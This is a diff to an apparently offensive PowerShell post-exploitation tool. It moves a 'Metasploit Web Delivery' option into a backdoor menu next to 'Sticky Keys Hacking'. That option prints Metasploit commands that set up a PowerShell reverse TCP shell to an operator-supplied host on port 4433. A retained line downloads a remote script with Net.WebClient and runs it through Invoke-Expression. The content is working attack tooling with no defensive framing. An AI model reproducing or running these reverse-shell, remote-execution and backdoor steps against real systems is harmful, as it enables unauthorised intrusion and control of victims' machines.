@@ -249,8 +249,7 @@ function Remove-Exclusions {
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt39" -ForegroundColor Gray
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt51" -ForegroundColor Gray
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt52" -ForegroundColor Gray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - Metasploit Web Delivery" -ForegroundColor Gray
-	Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
+        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
         Write-Host ; $Random = New-Object System.Random ; $txt8 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
         $Host.UI.RawUI.ForegroundColor = 'Green' ; $shell = $Host.UI.ReadLine() ; Write-Host
@@ -266,17 +265,8 @@ function Remove-Exclusions {
         Write-Host "$txt54" -NoNewLine -ForegroundColor Gray ; $ipadress = $Host.UI.ReadLine() ; Write-Host
 	Write-Host "$txt46" -ForegroundColor Green ; $netcat = 'remote' ; sleep -milliseconds 2500 }
 
-        if($shell -like '4'){ $metasploit = "true" ; Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 
-	$metarandom = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_}) ; Write-Host
-	Write-host "$txt65" -NoNewLine -ForegroundColor Gray ; $metaserver = $Host.UI.ReadLine() ; $Host.UI.RawUI.ForegroundColor = 'Gray'
-	Write-Host ; Write-Host "$txt63" -ForegroundColor Red ; Write-Host ; Write-host "use exploit/multi/script/web_delivery"
-	Write-host "set SRVHOST $metaserver" ; Write-host "set SRVPORT 80" ; Write-host "set SSL false" ; Write-host "set target 2"
-        Write-host "set payload windows/powershell_reverse_tcp" ; Write-host "set LHOST $metaserver"
-	Write-host "set LPORT 4433" ; Write-host "set URIPATH $metarandom" ; Write-host "exploit -j"
-	Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; sleep -milliseconds 2500 }
-
         if($shell -like 'X'){ $input = 'x' ; continue }
-        if($shell -in '1','2','3','4','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; sleep -milliseconds 2500 }}
+        if($shell -in '1','2','3','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; sleep -milliseconds 2500 }}
 
         if($module -like '2') { Show-Banner
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt9" -ForegroundColor Gray
@@ -391,14 +381,25 @@ function Remove-Exclusions {
         
 	if($module -like '5') { Show-Banner
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - Sticky Keys Hacking" -ForegroundColor Gray
+        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - Metasploit Web Delivery" -ForegroundColor Gray
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
         Write-Host ; $Random = New-Object System.Random ; $txt8 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
 	$Host.UI.RawUI.ForegroundColor = 'Green' ; $backdoor = $Host.UI.ReadLine() ; Write-Host
 	
 	if($backdoor -like '1') { $stickykeys ="true" ; Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 }
+
+        if($backdoor -like '2') { $metasploit = "true" ; Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 
+	$metarandom = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_}) ; Write-Host
+	Write-host "$txt65" -NoNewLine -ForegroundColor Gray ; $metaserver = $Host.UI.ReadLine() ; $Host.UI.RawUI.ForegroundColor = 'Gray'
+	Write-Host ; Write-Host "$txt63" -ForegroundColor Red ; Write-Host ; Write-host "use exploit/multi/script/web_delivery"
+	Write-host "set SRVHOST $metaserver" ; Write-host "set SRVPORT 80" ; Write-host "set SSL false" ; Write-host "set target 2"
+        Write-host "set payload windows/powershell_reverse_tcp" ; Write-host "set LHOST $metaserver"
+	Write-host "set LPORT 4433" ; Write-host "set URIPATH $metarandom" ; Write-host "exploit -j"
+	Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; sleep -milliseconds 2500 }
+
 	if($backdoor -like 'X'){ $input = 'x' ; continue }
-        if($backdoor -in '1','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; sleep -milliseconds 2500 }}
+        if($backdoor -in '1','2','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; sleep -milliseconds 2500 }}
 
         if($module -like '6') { Show-Banner
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt70" -ForegroundColor Gray
@@ -443,7 +444,7 @@ function Remove-Exclusions {
         Write-Host "$txt73" -NoNewLine -ForegroundColor Gray ; $externalscript = $Host.UI.ReadLine() ; Write-Host
         Write-Host "$txt74" -NoNewLine -ForegroundColor Gray ; $externalfunction = $Host.UI.ReadLine() ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
 	if($externalscript -like 'http*') { Invoke-Expression (New-Object Net.WebClient).DownloadString("$externalscript") } else { Import-Module $externalscript }
-        if($externalfunction = $null){ $null } else { Invoke-Expression $externalfunction } ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; sleep -milliseconds 2500 }
+        if($externalfunction){ Invoke-Expression $externalfunction } ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; sleep -milliseconds 2500 }
 
         if($othermodule -like 'X'){ $input = 'x' ; continue }
         if($othermodule -in '1','2','3','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; sleep -milliseconds 2500 }}
